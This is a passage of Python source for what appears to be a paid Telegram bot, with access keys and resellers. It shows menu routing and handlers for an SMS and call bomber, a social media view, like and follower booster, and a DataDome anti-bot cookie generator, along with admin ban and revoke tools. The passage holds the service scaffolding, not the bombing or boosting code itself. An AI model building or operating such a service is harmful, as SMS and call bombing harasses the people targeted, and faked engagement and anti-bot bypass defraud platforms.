            success, result_message = await booster.boost_twitter_views(target_url)
        elif boost_type == 'boost_youtube_views':
            success, result_message = await booster.boost_youtube_views(target_url)
        elif boost_type == 'boost_youtube_likes':
            success, result_message = await booster.boost_youtube_likes(target_url)
        else:
            result_message = "Unknown boost type"
    except Exception as e:
        success = False
        result_message = f"Error: {str(e)}"
    finally:
        # Always close the aiohttp session to prevent "Unclosed client session" errors
        await booster.close()
    
    # Send result
    now_str = datetime.datetime.now().strftime("%I:%M %p")
    if success:
        final_message = (
            f"✅ *ʙᴏᴏsᴛ sᴜᴄᴄᴇssғᴜʟ!*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🚀 sᴇʀᴠɪᴄᴇ: *{service_name}*\n"
            f"🔗 ᴛᴀʀɢᴇᴛ: `{target_url[:50]}{'...' if len(target_url) > 50 else ''}`\n"
            f"📋 ʀᴇsᴜʟᴛ: {result_message}\n"
            f"🕐 ᴛɪᴍᴇ: `{now_str}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            "⏱️ ᴄʜᴀɴɢᴇs ᴍᴀʏ ᴛᴀᴋᴇ ᴀ ғᴇᴡ ᴍɪɴᴜᴛᴇs ᴛᴏ ᴀᴘᴘᴇᴀʀ."
        )
    else:
        final_message = (
            f"❌ *ʙᴏᴏsᴛ ғᴀɪʟᴇᴅ*\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"🚀 sᴇʀᴠɪᴄᴇ: *{service_name}*\n"
            f"🔗 ᴛᴀʀɢᴇᴛ: `{target_url[:50]}{'...' if len(target_url) > 50 else ''}`\n"
            f"⚠️ ᴇʀʀᴏʀ: {result_message}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            "💡 ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ ᴏʀ ᴄʜᴇᴄᴋ ᴛʜᴇ URL."
        )
    
    # Edit the processing message with results
    await safe_edit(processing_msg, final_message, parse_mode="Markdown")
    
    # Add back button
    keyboard = [[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ʙᴏᴏsᴛᴇʀ ᴍᴇɴᴜ", callback_data="social_media_booster_menu")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.effective_message.reply_text(
        "✨ *ʙᴏᴏsᴛ ᴘʀᴏᴄᴇss ᴄᴏᴍᴘʟᴇᴛᴇ* ✨",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )
    
    BOOSTER_ACTIVE.discard(user_id)
    context.user_data.pop('boost_type', None)

# ========== RESELLER STATS ==========
async def reseller_stats(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("reseller_stats called with no effective message.")
        return

    user_id = update.effective_user.id
    
    if USER_ROLES.get(user_id) not in ("reseller", "owner"):
        if update.callback_query:
            await safe_answer_callback(update.callback_query, "❌ Access Denied!", show_alert=True)
            await safe_edit(current_message, "❌ *ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ* — ʀᴇsᴇʟʟᴇʀs ᴏɴʟʏ.", parse_mode="Markdown")
        else:
            await current_message.reply_text("❌ *ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ* — ʀᴇsᴇʟʟᴇʀs ᴏɴʟʏ.", parse_mode="Markdown")
        return

    # Count keys generated by this reseller (active & used)
    keys_active = sum(1 for k, v in ACCESS_KEYS.items() if v.get("created_by") == user_id)
    keys_used = sum(1 for k in USED_KEYS if ACCESS_KEYS.get(k, {}).get("created_by") == user_id)
    # Count users activated by this reseller's keys (in USER_STATS cross with USED_KEYS)
    activated_users = 0
    for uid, stats in USER_STATS.items():
        pass  # tracked via used_keys created_by
    keys_total = keys_active + keys_used

    now = datetime.datetime.now().strftime("%b %d, %Y • %I:%M %p")
    access_info = USER_ACCESS.get(user_id)
    if access_info is None and user_id in USER_ACCESS:
        my_access = "♾️ ʟɪғᴇᴛɪᴍᴇ"
    elif access_info and access_info > datetime.datetime.now().timestamp():
        days_left = int((access_info - datetime.datetime.now().timestamp()) // 86400)
        my_access = f"✅ {days_left}d ʀᴇᴍᴀɪɴɪɴɢ"
    else:
        my_access = "❌ ᴇxᴘɪʀᴇᴅ"

    stats_text = (
        f"💼 *ʀᴇsᴇʟʟᴇʀ ᴅᴀsʜʙᴏᴀʀᴅ*\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 *{update.effective_user.first_name}* (`{user_id}`)\n"
        f"🔐 ᴍʏ ᴀᴄᴄᴇss: {my_access}\n"
        f"🕐 `{now}`\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔑 *ᴋᴇʏ ᴀᴄᴛɪᴠɪᴛʏ*\n"
        f"┣ 🟢 ᴀᴄᴛɪᴠᴇ ᴋᴇʏs: *{keys_active}*\n"
        f"┣ ✅ ᴜsᴇᴅ ᴋᴇʏs: *{keys_used}*\n"
        f"┗ 📊 ᴛᴏᴛᴀʟ ɢᴇɴᴇʀᴀᴛᴇᴅ: *{keys_total}*\n\n"
        f"💡 *ᴛɪᴘs*\n"
        f"┣ ᴜsᴇ sʜᴏʀᴛ ᴋᴇʏs (1-7ᴅ) ғᴏʀ ᴄʟɪᴇɴᴛs\n"
        f"┣ ᴄʜᴇᴄᴋ ᴋᴇʏ ᴇxᴘɪʀʏ ʙᴇғᴏʀᴇ sʜᴀʀɪɴɢ\n"
        f"┗ ᴄᴏɴᴛᴀᴄᴛ @ZyronDevv  ғᴏʀ ʙᴜʟᴋ ᴘʀɪᴄɪɴɢ"
    )
    
    keyboard = [
        [InlineKeyboardButton("🔑 ɢᴇɴᴇʀᴀᴛᴇ ᴋᴇʏ", callback_data="admin_gen_key")],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if update.callback_query:
        await safe_edit(current_message, stats_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(stats_text, reply_markup=reply_markup, parse_mode="Markdown")

# ========== COOLDOWN & FLOOD PROTECTION ==========
_USER_FLOOD: dict = {}        # uid → list of timestamps
FLOOD_MAX_MSGS  = 10          # max messages in window
FLOOD_WINDOW    = 10          # seconds

# Per-tool rate limits {tool_key: (max_calls, per_seconds)}
TOOL_RATE_LIMITS = {
    "sms_bomb":  (1, 300),   # once per 5 min
    "boost":     (3, 3600),  # 3x per hour
    "generate":  (5, 300),   # 5x per 5 min
}
_TOOL_STAMPS: dict = {}  # (uid, tool) → [timestamps]

def record_tool_use(tool: str):
    """Increment the per-tool hourly usage bucket for analytics."""
    now_hour = int(time.time() // 3600) * 3600  # floor to current hour
    if tool in TOOL_HOURLY_USAGE:
        TOOL_HOURLY_USAGE[tool][now_hour] = TOOL_HOURLY_USAGE[tool].get(now_hour, 0) + 1
    # Also increment GLOBAL_STATS
    key = f"total_{tool}_uses"
    GLOBAL_STATS[key] = GLOBAL_STATS.get(key, 0) + 1

def check_tool_rate(user_id: int, tool: str) -> bool:
    """Return True if user has exceeded rate limit for this tool. Admin exempt."""
    if user_id == ADMIN_ID:
        return False
    max_calls, per_secs = TOOL_RATE_LIMITS.get(tool, (999, 1))
    now = time.time()
    key = (user_id, tool)
    stamps = _TOOL_STAMPS.setdefault(key, [])
    _TOOL_STAMPS[key] = [t for t in stamps if now - t < per_secs]
    if len(_TOOL_STAMPS[key]) >= max_calls:
        return True
    _TOOL_STAMPS[key].append(now)
    return False

def is_flooding(user_id: int) -> bool:
    """Return True if user sent more than FLOOD_MAX_MSGS in FLOOD_WINDOW seconds."""
    now = time.time()
    timestamps = _USER_FLOOD.setdefault(user_id, [])
    # prune old entries
    _USER_FLOOD[user_id] = [t for t in timestamps if now - t < FLOOD_WINDOW]
    _USER_FLOOD[user_id].append(now)
    return len(_USER_FLOOD[user_id]) > FLOOD_MAX_MSGS

# ========== REPLY KEYBOARD BUTTON TEXT ROUTING ==========
REPLY_KEYBOARD_ROUTES = {
    "📂 ɢᴇɴᴇʀᴀᴛᴇ ғɪʟᴇs":              "show_generate_menu",
    "📊 ᴍʏ sᴛᴀᴛɪsᴛɪᴄs":               "show_stats",
    "🔑 ʀᴇᴅᴇᴇᴍ ᴋᴇʏ":                  "prompt_key",
    "🔐 ᴘʏᴛʜᴏɴ ᴇɴᴄʀʏᴘᴛᴏʀ":           "start_encryption",
    "🛠️ ᴜʟᴘ & ᴅᴜᴘʟɪᴄᴀᴛᴇ ʀᴇᴍᴏᴠᴇʀ":   "url_duplicate_remover",
    "🛡️ ᴅᴀᴛᴀᴅᴏᴍᴇ ɢᴇɴᴇʀᴀᴛᴏʀ":         "datadome_menu",
    "💣 sᴍs & ᴄᴀʟʟ ʙᴏᴍʙᴇʀ":           "sms_bomber_menu",
    "🚀 sᴏᴄɪᴀʟ ᴍᴇᴅɪᴀ ʙᴏᴏsᴛᴇʀ":        "social_media_booster_menu",
    "📥 ᴛᴏᴏʟs":                        "show_tools",
    "💬 ғᴇᴇᴅʙᴀᴄᴋ ʜᴇʀᴇ":               "prompt_feedback",
    "ℹ️ ʜᴇʟᴘ & ɪɴғᴏ":                  "show_help",
    "👑 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ":                  "show_admin_panel",
    "👥 ᴍᴀɴᴀɢᴇ ʀᴏʟᴇs":                "admin_manage_roles",
    "📣 sᴇɴᴅ ᴀɴɴᴏᴜɴᴄᴇᴍᴇɴᴛ":           "admin_announce",
    "🔴 ʀᴇᴠᴏᴋᴇ ᴀᴄᴄᴇss":               "admin_revoke",
    "📋 ᴜsᴇʀ ʟɪsᴛs":                   "admin_users",
    "💾 ᴅᴀᴛᴀʙᴀsᴇ sᴛᴀᴛᴜs":             "show_db_status",
    "🗑️ ᴅᴇʟᴇᴛᴇ sɪɴɢʟᴇ ᴋᴇʏ":           "admin_delete_single_key",
    "🛠️ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ (ᴏɴ/ᴏғғ)":        "show_maintenance_options",
    "🔑 ɢᴇɴᴇʀᴀᴛᴇ ᴋᴇʏ":                "admin_gen_key",
    "📋 ᴍʏ ʀᴇғᴇʀʀᴀʟ sᴛᴀᴛs":           "reseller_stats",
    "🔗 ʀᴇғᴇʀʀᴀʟ":                       "show_referral",
    "🐍 TUTS FOR PYTHON":               "tuts_for_python",
}

# ========== TUTS FOR PYTHON BUTTON HANDLER ==========
async def tuts_for_python(update: Update, context: CallbackContext):
    """Send an inline button that opens @TUTSFORPYTHON channel."""
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🐍 TUTS FOR PYTHON", url="https://t.me/TUTSFORPYTHON")],
    ])
    await update.effective_message.reply_text(
        "🐍 *TUTS FOR PYTHON*\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "ᴛᴀᴘ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ʙᴇʟᴏᴡ ᴛᴏ ᴊᴏɪɴ ᴛʜᴇ ᴄʜᴀɴɴᴇʟ!",
        reply_markup=keyboard,
        parse_mode="Markdown"
    )

# ========== HANDLE UNKNOWN MESSAGES ==========
async def handle_unknown_message(update: Update, context: CallbackContext):
    if not update.effective_user:
        return
    user_id = update.effective_user.id

    # ── Ban check ────────────────────────────────────────────────
    if user_id in BANNED_USERS:
        await update.effective_message.reply_text("🚫 You are banned from using this bot.")
        return

    # ── Flood protection ─────────────────────────────────────────
    if not is_at_least_role(user_id, "owner") and is_flooding(user_id):
        return  # silently drop — don't reply (avoids feedback loop)

    # ── 5-second cooldown (admin is exempt) ──────────────────────
    # Use _update_timestamp=False here so the dispatched function below
    # can stamp the timestamp itself — avoids a double-stamp that would
    # cause the next command to immediately see a false 5s wait.
    if await check_cooldown(update, _update_timestamp=False):
        return
    # ─────────────────────────────────────────────────────────────

    # Route reply keyboard button presses (they arrive as plain text messages)
    if update.message and update.message.text:
        text = update.message.text.strip()
        if text in REPLY_KEYBOARD_ROUTES:
            action = REPLY_KEYBOARD_ROUTES[text]
            # Dispatch directly to the right function using the message as context
            # These handlers all accept (update, context) with update.message set
            dispatch_map = {
                "show_generate_menu":        generate_menu,
                "show_stats":                show_stats,
                "prompt_key":                prompt_for_key,
                # "start_encryption" is intentionally NOT here — the ConversationHandler
                # entry_point catches the reply-keyboard press and registers the state.
                "url_duplicate_remover":     url_duplicate_remover_menu,
                "datadome_menu":             datadome_menu,
                "sms_bomber_menu":           sms_bomber_menu,
                "social_media_booster_menu": social_media_booster_menu,
                "show_tools":                show_tools_menu,
                "prompt_feedback":           prompt_feedback,
                "show_help":                 show_help,
                "show_admin_panel":          admin_panel,
                "admin_manage_roles":        admin_manage_roles,
                "admin_announce":            send_announcement,
                "admin_revoke":              revoke_access,
                "admin_users":               user_list,
                "show_db_status":            database_status,
                "admin_delete_single_key":   prompt_delete_single_key,
                "show_maintenance_options":  show_maintenance_options,
                "admin_gen_key":             generate_key_command,
                "reseller_stats":            reseller_stats,
                "show_referral":             show_referral_menu,
                "tuts_for_python":           tuts_for_python,
            }
            handler = dispatch_map.get(action)
            if handler:
                await handler(update, context)
            return
    
    # Key-generation flows take priority over key-redemption input
    # (prevents "1" during max-uses prompt being mistaken for a key attempt)
    if user_id in AWAITING_KEY_COUNT:
        await handle_key_count(update, context)
    elif user_id in AWAITING_KEY_USES:
        await handle_key_uses(update, context)
    elif user_id in AWAITING_KEY_DURATION:
        await handle_key_duration(update, context)
    elif user_id in AWAITING_KEY_INPUT:
        await handle_enter_key(update, context)
    elif user_id in AWAITING_REVOKE_USER:
        await handle_revoke_user(update, context)
    elif user_id in AWAITING_ANNOUNCEMENT:
        await handle_announcement(update, context)
    elif user_id in AWAITING_DELETE_KEY:
        await handle_delete_key(update, context)
    elif user_id in AWAITING_ROLE_USER_ID:
        await handle_role_user_id_input(update, context)
    elif user_id in AWAITING_FEEDBACK:
        await handle_feedback(update, context)
    elif user_id in AWAITING_FILE_UPLOAD:
        await handle_file_processing(update, context)
    elif user_id in AWAITING_BOMBER_PHONE:
        await handle_bomber_phone(update, context)
    elif user_id in AWAITING_BOMBER_AMOUNT:
        await handle_bomber_amount(update, context)
    elif user_id in AWAITING_BOMBER_SENDER:
        await handle_bomber_sender(update, context)
    elif user_id in AWAITING_BOMBER_MESSAGE:
        await handle_bomber_message(update, context)
    elif user_id in AWAITING_BOOST_URL:
        await handle_boost_url(update, context)
    elif user_id in AWAITING_TOOL_UPLOAD:
        await handle_tool_upload(update, context)
    elif user_id in AWAITING_REVOKE_MULTI_KEYS:
        await handle_revoke_multi_keys(update, context)
    else:
        await update.effective_message.reply_text(
            "⚠️ *ᴜɴᴋɴᴏᴡɴ ᴄᴏᴍᴍᴀɴᴅ*\n\n"
            "ᴜsᴇ ᴛʜᴇ ᴍᴇɴᴜ ʙᴜᴛᴛᴏɴs ᴏʀ ᴛʏᴘᴇ /start.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]]),
            parse_mode="Markdown"
        )

# ========== TOOLS MENU ==========
async def show_tools_menu(update: Update, context: CallbackContext):
    query = update.callback_query
    current_message = query.message if query else update.message
    if not os.path.exists(TOOLS_FOLDER):
        os.makedirs(TOOLS_FOLDER)
    files = sorted([f for f in os.listdir(TOOLS_FOLDER) if os.path.isfile(os.path.join(TOOLS_FOLDER, f))])

    back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]])

    async def _send(text, markup):
        if query:
            await safe_edit(current_message, text, reply_markup=markup, parse_mode="Markdown")
        else:
            await current_message.reply_text(text, reply_markup=markup, parse_mode="Markdown")

    if not files:
        await _send(
            "📥 *ᴛᴏᴏʟs*\n━━━━━━━━━━━━━━━━━━━━\n\n⚠️ ɴᴏ ᴛᴏᴏʟs ᴀᴠᴀɪʟᴀʙʟᴇ ʏᴇᴛ.\n\nᴀsᴋ @ZyronDevv  ᴛᴏ ᴜᴘʟᴏᴀᴅ ᴛᴏᴏʟs.",
            back_kb
        )
        return

    keyboard = []
    for filename in files:
        filepath = os.path.join(TOOLS_FOLDER, filename)
        try:
            size_kb = os.path.getsize(filepath) / 1024
            size_str = f"{size_kb:.1f}KB" if size_kb < 1024 else f"{size_kb/1024:.1f}MB"
        except Exception:
            size_str = "?"
        keyboard.append([InlineKeyboardButton(f"📥 {filename}  [{size_str}]", callback_data=f"dl_{filename}")])
    keyboard.append([InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")])

    await _send(
        f"📥 *ᴛᴏᴏʟs*\n━━━━━━━━━━━━━━━━━━━━\n"
        f"📦 {len(files)} ᴛᴏᴏʟ(s) ᴀᴠᴀɪʟᴀʙʟᴇ\n\n"
        "sᴇʟᴇᴄᴛ ᴀ ғɪʟᴇ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ:",
        InlineKeyboardMarkup(keyboard)
    )

async def download_tool_file(update: Update, context: CallbackContext):
    query = update.callback_query
    filename = query.data[3:]  # remove "dl_"
    filepath = os.path.join(TOOLS_FOLDER, filename)

    if os.path.exists(filepath):
        try:
            size_kb = os.path.getsize(filepath) / 1024
            size_str = f"{size_kb:.1f} KB" if size_kb < 1024 else f"{size_kb/1024:.1f} MB"
        except Exception:
            size_str = "unknown"
        await safe_answer_callback(query, f"Downloading {filename}...", show_alert=False)
        await query.message.reply_document(
            document=open(filepath, "rb"),
            filename=filename,
            caption=(
                f"✅ *ᴅᴏᴡɴʟᴏᴀᴅ ᴄᴏᴍᴘʟᴇᴛᴇ*\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📄 `{filename}`\n"
                f"📦 sɪᴢᴇ: `{size_str}`\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📞 @ZyronDevv "
            ),
            parse_mode="Markdown"
        )
    else:
        await safe_answer_callback(query, "❌ File not found!", show_alert=True)

# ========== CALLBACK QUERY HANDLER ==========
async def handle_callback_query(update: Update, context: CallbackContext):
    query = update.callback_query
    # Guard: callbacks from channels/anonymous senders have no user
    if not query or not update.effective_user:
        return

    user_id = update.effective_user.id

    # ── Global maintenance gate (#21) ────────────────────────────
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        try:
            await safe_answer_callback(query, "🛠️ ʙᴏᴛ ɪs ᴜɴᴅᴇʀ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ.", show_alert=True)
            await query.message.edit_text(
                "🛠️ *ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ*\nᴘʟᴇᴀsᴇ ᴡᴀɪᴛ. ʙᴀᴄᴋ sʜᴏʀᴛʟʏ.\n📞 @ZyronDevv ",
                parse_mode="Markdown"
            )
        except Exception:
            pass
        return

    try:
        await safe_answer_callback(query)
    except Exception:
        pass

    data = query.data
    
    try:
        if data == "show_generate_menu":
            await generate_menu(update, context)
        elif data == "database_menu":
            await database_menu(update, context)
        elif data.startswith("generate:"):
            await generate_file(update, context)
        elif data == "show_stats":
            await show_stats(update, context)
        elif data == "show_mykey":
            await mykey_command(update, context)
        elif data == "show_refer":
            bot_info = await context.bot.get_me()
            uid = update.effective_user.id
            link = f"https://t.me/{bot_info.username}?start=ref_{uid}"
            await query.message.reply_text(f"🔗 *ʏᴏᴜʀ ʀᴇғᴇʀʀᴀʟ ʟɪɴᴋ*\n`{link}`", parse_mode="Markdown")
        elif data == "prompt_key":
            await prompt_for_key(update, context)
        elif data == "start_encryption":
            await start_encryption(update, context)
        elif data.startswith("enc_method_"):
            await handle_enc_method_callback(update, context)
        elif data.startswith("enc_page_"):
            await enc_handle_pagination(update, context)
        elif data == "cancel_encryption_conv":
            await cancel_encryption(update, context)
        elif data == "url_duplicate_remover":
            await url_duplicate_remover_menu(update, context)
        elif data == "remove_urls":
            await start_url_removal(update, context)
        elif data == "remove_duplicates":
            await start_duplicate_removal(update, context)
        elif data == "datadome_menu":
            await datadome_menu(update, context)
        elif data == "generate_datadome":
            await generate_datadome_cookie(update, context)
        elif data == "generate_datadome_file":
            await generate_datadome_file(update, context)
        elif data == "datadome_info":
            await datadome_info(update, context)
        elif data == "sms_bomber_menu":
            await sms_bomber_menu(update, context)
        elif data == "start_sms_bomber":
            await start_sms_bomber(update, context)
        elif data == "stop_sms_bomber":
            await stop_sms_bomber(update, context)
        elif data == "bomber_stats":
            await bomber_stats(update, context)
        elif data == "bomber_info":
            await bomber_info(update, context)
        elif data == "social_media_booster_menu":
            await social_media_booster_menu(update, context)
        elif data in ["boost_tiktok_views", "boost_tiktok_followers", "boost_tiktok_likes",
                     "boost_telegram_views", "boost_facebook", "boost_instagram_views",
                     "boost_twitter_views", "boost_youtube_views"]:
            await start_boost_process(update, context)
        elif data == "show_admin_panel":
            await admin_panel(update, context)
        elif data == "admin_gen_key" or data == "admin_gen_key_single":
            await generate_key_command(update, context)
        elif data == "admin_gen_key_multi":
            await generate_key_command(update, context)
        elif data in ("genkey_tier_basic", "genkey_tier_vip"):
            await handle_key_tier_callback(update, context)
        elif data == "admin_users":
            await user_list(update, context, page=0)
        elif data == "userlist_noop":
            if update.callback_query:
                await safe_answer_callback(update.callback_query)
        elif data.startswith("userlist_page_"):
            if update.callback_query:
                await safe_answer_callback(update.callback_query)
            try:
                page = int(data.split("_")[-1])
            except ValueError:
                page = 0
            context.user_data["userlist_page"] = page
            await user_list(update, context, page=page)
        elif data == "admin_revoke":
            await revoke_access(update, context)
        elif data == "admin_revoke_multi_keys":
            await revoke_multi_keys(update, context)
        elif data == "admin_announce":
            await send_announcement(update, context)
        elif data == "admin_delete_single_key":
            await prompt_delete_single_key(update, context)
        elif data == "show_maintenance_options":
            await show_maintenance_options(update, context)
        elif data == "admin_turn_on_maintenance":
            await admin_turn_on_maintenance(update, context)
        elif data == "admin_turn_off_maintenance":
            await admin_turn_off_maintenance(update, context)
        elif data == "admin_manage_roles":
            await admin_manage_roles(update, context)
        elif data == "admin_prompt_role_user_id":
            await admin_prompt_role_user_id(update, context)
        elif data.startswith("assign_role:"):
            await admin_assign_selected_role(update, context)
        elif data == "show_db_status":
            await database_status(update, context)
        elif data == "prompt_feedback":
            await prompt_feedback(update, context)
        elif data == "show_stats":
            await show_stats(update, context)
        elif data == "show_help":
            await show_help(update, context)
        elif data == "verify_join":
            await verify_join(update, context)
        elif data == "show_referral":
            await show_referral_menu(update, context)
        elif data == "exchange_points":
            await exchange_points(update, context)
        elif data == "db_page_noop":
            pass
        elif data.startswith("db_page_"):
            try:
                page = int(data.replace("db_page_", ""))
            except ValueError:
                page = 0
            context.user_data["db_page"] = page
            await database_menu(update, context)

        elif data == "cancel_action":
            await cancel_action(update, context)
        elif data.startswith("bcast_target_"):
            # Store chosen broadcast target then prompt for message (#4)
            target = data.replace("bcast_target_", "")
            context.user_data["bcast_target"] = target
            label_map = {"all": "👥 ᴀʟʟ ᴜsᴇʀs", "active": "✅ ᴀᴄᴛɪᴠᴇ ᴏɴʟʏ",
                         "expired": "❌ ᴇxᴘɪʀᴇᴅ ᴏɴʟʏ", "vip": "💎 ᴠɪᴘ ᴏɴʟʏ"}
            label = label_map.get(target, target)
            await query.message.edit_text(
                f"📣 *ʙʀᴏᴀᴅᴄᴀsᴛ ᴛᴏ: {label}*\n\n"
                "sᴇɴᴅ ʏᴏᴜʀ ᴍᴇssᴀɢᴇ ɴᴏᴡ:\n_(ᴛᴇxᴛ, ᴘʜᴏᴛᴏ, ᴠɪᴅᴇᴏ ᴀʟʟ sᴜᴘᴘᴏʀᴛᴇᴅ)_",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]),
                parse_mode="Markdown"
            )
        elif data == "back_to_main_menu":
            await back_to_main_menu(update, context)
        elif data.startswith("madmin_"):
            await _handle_miniadmin_callback(update, context, data)
        elif data.startswith("helpadmin_"):
            await _handle_helpadmin_callback(update, context, data)
        elif data.startswith("quick_warn_"):
            target = int(data.split("_")[2])
            USER_WARNINGS.setdefault(target, []).append({"reason": "Quick action", "ts": datetime.datetime.now().strftime("%Y-%m-%d %H:%M")})
            schedule_save()
            await safe_answer_callback(query, f"⚠️ User {target} warned ({len(USER_WARNINGS[target])}/{WARNING_THRESHOLD})", show_alert=True)
        elif data.startswith("quick_ban_"):
            target = int(data.split("_")[2])
            BANNED_USERS.add(target)
            schedule_save()
            await safe_answer_callback(query, f"🚫 User {target} banned.", show_alert=True)
        elif data.startswith("quick_note_"):
            target = int(data.split("_")[2])
            context.user_data["quick_note_target"] = target
            await query.message.reply_text(f"📝 Send the note for `{target}`:", parse_mode="Markdown")
            await safe_answer_callback(query)
        elif data == "admin_backup":
            await admin_backup(update, context)
        elif data == "admin_reload":
            await admin_reload(update, context)
        elif data == "show_tools":
            await show_tools_menu(update, context)
        elif data.startswith("dl_"):
            await download_tool_file(update, context)
        elif data == "reseller_stats":
            await reseller_stats(update, context)
        elif data.startswith("ul_view_"):
            # Show full detail card for a user from the list
            target_id = int(data.split("_", 2)[2])
            now_ts = datetime.datetime.now().timestamp()
            # Fetch live username
            tg_username = ""
            try:
                chat = await asyncio.wait_for(context.bot.get_chat(target_id), timeout=3.0)
                tg_username = f"@{chat.username}" if chat.username else (chat.first_name or "")
                if tg_username and target_id in USER_STATS:
                    USER_STATS[target_id]["username"] = tg_username
            except Exception:
                pass

            access_info = USER_ACCESS.get(target_id)
            badge, expiry_str, is_active = _user_status(target_id, access_info, now_ts)
            role = USER_ROLES.get(target_id, "user")
            stats = USER_STATS.get(target_id, {})
            gens = stats.get("generations", 0)
            keys_used = stats.get("keys_used", 0)
            referrals = stats.get("referrals", 0)
            joined_raw = stats.get("joined")
            joined_str = "—"
            if joined_raw:
                try: joined_str = datetime.datetime.fromisoformat(joined_raw).strftime("%b %d, %Y")
                except: joined_str = str(joined_raw)[:10]
            last_raw = stats.get("last_active")
            last_seen = "never"
            if last_raw:
                try: last_seen = datetime.datetime.fromisoformat(last_raw).strftime("%b %d · %H:%M")
                except: last_seen = str(last_raw)[:16]

            uname_display = tg_username or stats.get("username", "") or "(no username)"
            if uname_display and not uname_display.startswith("@") and " " not in uname_display and len(uname_display) <= 32 and uname_display != "(no username)":
                uname_display = f"@{uname_display}"

            detail = (
                f"👤 *User Detail*\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🆔 ID       ┊ `{target_id}`\n"
                f"💬 Username ┊ {uname_display}\n"
                f"🏷️ Role     ┊ `{role}`\n"
                f"🔰 Status   ┊ {badge}\n"
                f"⏳ Expiry   ┊ `{expiry_str}`\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"⚙️ Generated ┊ `{gens:,} lines`\n"
                f"🔑 Keys Used ┊ `{keys_used}`\n"
                f"🔗 Referrals ┊ `{referrals} pts`\n"
                f"📅 Joined    ┊ `{joined_str}`\n"
                f"🕐 Last Seen ┊ `{last_seen}`\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"*Quick Actions:*\n"
                f"`/approve {target_id} 30d`\n"
                f"`/revoke {target_id}`\n"
                f"`/ban {target_id} reason`"
            )
            back_page = context.user_data.get("userlist_page", 0)
            context.user_data["action_source"] = "userlist"  # so quick actions return here
            detail_kb = InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("✅ +7d",  callback_data=f"quick_approve_{target_id}_7"),
                    InlineKeyboardButton("✅ +30d", callback_data=f"quick_approve_{target_id}_30"),
                    InlineKeyboardButton("✅ +90d", callback_data=f"quick_approve_{target_id}_90"),
                ],
                [
                    InlineKeyboardButton("🔴 Revoke",     callback_data=f"quick_revoke_{target_id}"),
                    InlineKeyboardButton("🚫 Ban",         callback_data=f"ul_ban_{target_id}"),
                ],
                [InlineKeyboardButton("⬅️ Back to List", callback_data=f"userlist_page_{back_page}")],
            ])
            await safe_edit(query.message, detail, reply_markup=detail_kb, parse_mode="Markdown")

        elif data.startswith("ul_ban_"):
            target_id = int(data.split("_", 2)[2])
            if target_id == ADMIN_ID:
                await safe_answer_callback(query, "❌ Cannot ban admin!", show_alert=True)
            else:
                BANNED_USERS.add(target_id)
                if target_id in USER_ACCESS:
                    del USER_ACCESS[target_id]
                schedule_save()
                await safe_answer_callback(query, f"🚫 Banned {target_id}", show_alert=True)
                if context.user_data.get("action_source") == "userlist":
                    back_page = context.user_data.get("userlist_page", 0)
                    await user_list(update, context, page=back_page)
                else:
                    await safe_edit(
                        query.message,
                        f"🚫 *User `{target_id}` has been banned.*\n\nAccess revoked.",
                        reply_markup=InlineKeyboardMarkup([[
                            InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", callback_data="show_admin_panel")
                        ]]),
                        parse_mode="Markdown"
                    )

        elif data.startswith("quick_revoke_"):
            target_id = int(data.split("_", 2)[2])
            if target_id == ADMIN_ID:
                await safe_answer_callback(query, "❌ Cannot revoke admin!", show_alert=True)
            elif target_id in USER_ACCESS:
                del USER_ACCESS[target_id]
                USER_ROLES[target_id] = "user"
                schedule_save()
                await safe_answer_callback(query, f"✅ Revoked access for {target_id}", show_alert=True)
                # If we came from userlist, refresh it; otherwise refresh the lookup card
                if context.user_data.get("action_source") == "userlist":
                    back_page = context.user_data.get("userlist_page", 0)
                    await user_list(update, context, page=back_page)
                else:
                    await _refresh_lookup_card(query, context, target_id)
            else:
                await safe_answer_callback(query, "❌ User not found in access list.", show_alert=True)

